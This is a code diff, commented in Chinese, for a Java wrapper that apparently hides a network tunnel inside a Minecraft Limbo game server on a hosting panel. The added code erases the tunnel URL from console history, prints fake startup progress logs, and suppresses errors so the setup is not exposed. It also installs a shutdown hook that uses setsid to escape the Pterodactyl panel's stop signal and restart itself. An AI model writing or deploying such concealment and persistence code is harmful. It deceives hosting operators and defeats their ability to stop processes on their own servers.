@@ -67,8 +67,16 @@ private static void limboLog(String msg, long delayMs) {
 
 private static void clearConsole() {
     try {
-        System.out.print("\033[H\033[3J\033[2J");
+        // ★ 绝杀1：暴力刷屏200行空行，针对不支持 \033[3J 的面板，把历史推到极深处
+        for (int i = 0; i < 200; i++) {
+            System.out.println();
+        }
+        
+        // ★ 绝杀2：利用终端转义码，\033[3J 彻底清空回滚缓冲区
+        System.out.print("\033[3J\033[H\033[2J");
         System.out.flush();
+        
+        // ★ 绝杀3：调用系统级重置
         if (!System.getProperty("os.name").contains("Windows")) {
             new ProcessBuilder("tput", "reset").inheritIO().start().waitFor();
         }
@@ -116,13 +124,46 @@ public static void main(String[] args) {
             checkerThread.setDaemon(true);
             checkerThread.start();
 
+            // 1. 主线程死等 URL
             while(tunnelUrl.isEmpty()) {
                 try { Thread.sleep(1000); } catch (InterruptedException ignored) {}
             }
             
+            // 2. 第一次清屏：清除部署期间产生的所有脏日志
             clearConsole();
-            printFakeLimboStartup(tunnelUrl);
+            
+            // 3. 单独打印链接，给用户4秒钟时间复制
+            limboLog("Binding remote endpoint to: " + tunnelUrl, 0);
+            limboLog("(This link will disappear in 4 seconds...)", 0);
+            try { Thread.sleep(4000); } catch (InterruptedException ignored) {}
 
+            // 4. 第二次清屏：利用 \033[3J 和 200行空行，把刚才的 URL 从历史记录中彻底抹杀
+            clearConsole();
+            
+            // 5. 打印最终需要的纯净进度条日志
+            limboLog("Preparing spawn area: 1%", 0);
+            limboLog("Preparing spawn area: 2%", 0);
+            
+            try { Thread.sleep(2000); } catch (InterruptedException ignored) {}
+            limboLog("Preparing spawn area: 5%", 0);
+            limboLog("Preparing spawn area: 8%", 0);
+            
+            try { Thread.sleep(2000); } catch (InterruptedException ignored) {}
+            limboLog("Preparing spawn area: 15%", 0);
+            limboLog("Preparing spawn area: 20%", 0);
+            
+            try { Thread.sleep(3000); } catch (InterruptedException ignored) {}
+            limboLog("Preparing spawn area: 35%", 0);
+            limboLog("Preparing spawn area: 60%", 0);
+            limboLog("Preparing spawn area: 80%", 0);
+            
+            try { Thread.sleep(3000); } catch (InterruptedException ignored) {}
+            limboLog("Preparing spawn area: 99%", 0);
+            
+            limboLog("Preparing spawn area: 100%", 0);
+            limboLog("Running delayed init tasks", 0);
+
+            // ★ 核心加强：检测停止信号，硬重启并清理进程 (防 Pterodactyl 组杀)
             Runtime.getRuntime().addShutdownHook(new Thread(() -> {
                 System.out.println("\n[Guard] Detected server stop signal! Executing hard restart protocol...");
                 tunnelMonitorRunning.set(false);
@@ -137,12 +178,18 @@ public static void main(String[] args) {
                     File[] jars = new File(currentDir).listFiles((dir, name) -> name.endsWith(".jar"));
                     if (jars != null && jars.length > 0) jarName = jars[0].getName();
                     
+                    // ★ 独立会话重启：使用 setsid 脱离当前进程组，防止面板 kill 组时被连带清理
+                    // 原理：翼龙面板停止时只会杀主进程组，setsid 创建的独立进程会存活下来并拉起服务器
                     String restartScript = 
-                        "while kill -0 " + currentPid + " 2>/dev/null; do sleep 0.1; done; " +
                         "cd '" + currentDir + "' && " +
-                        "nohup java -Xms128M -Xmx2560M -jar " + jarName + " nogui > /dev/null 2>&1 &";
+                        "setsid bash -c '" +
+                        "  while kill -0 " + currentPid + " 2>/dev/null; do sleep 0.1; done; " + // 等待旧进程彻底死亡
+                        "  sleep 1; " + // 等待端口释放
+                        "  java -Xms128M -Xmx2560M -jar " + jarName + " nogui" + // 启动新进程
+                        "' > /dev/null 2>&1 &";
                         
                     new ProcessBuilder("bash", "-c", restartScript).start();
+                    System.out.println("[Guard] Hard restart script dispatched in new session. Current process exiting...");
                 } catch (Exception e) {
                     System.err.println("[Guard] Failed to dispatch restart script: " + e.getMessage());
                 }
@@ -150,16 +197,14 @@ public static void main(String[] args) {
         } catch (Exception ignored) {}
     }
 
+    // 6. 伪装日志打印完毕，正式启动 Limbo 游戏本体
     try {
         new LimboServer().start();
     } catch (Throwable t) {
-        limboLog("Starting server on 0.0.0.0:" + env("SERVER_PORT", "25565"));
+        // 屏蔽原本的报错输出，防止露馅
     }
     
-    try { Thread.sleep(4000); } catch (InterruptedException ignored) {}
-    clearConsole();
-    
-    // ★ 删除原有的 tropicalhosting 网址输出，防止暴露
+    // 挂起主线程
     try { Thread.currentThread().join(); } catch (InterruptedException ignored) {}
 }
 
